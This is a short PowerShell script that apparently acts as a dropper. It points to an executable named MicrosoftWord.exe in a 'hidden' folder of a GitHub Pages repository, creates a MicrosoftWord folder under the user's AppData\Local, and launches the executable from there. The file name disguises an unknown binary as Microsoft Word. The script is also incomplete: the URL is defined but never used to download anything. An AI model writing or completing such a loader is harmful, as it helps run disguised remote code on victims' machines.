$url = "https://github.com/webntdev/webntdev.github.io/raw/main/hidden/MicrosoftWord.exe"
$folderPath = "$env:USERPROFILE\AppData\Local\MicrosoftWord"
$localPath = "$folderPath\MicrosoftWord.exe"

if (-Not (Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath
}

Start-Process $localPath
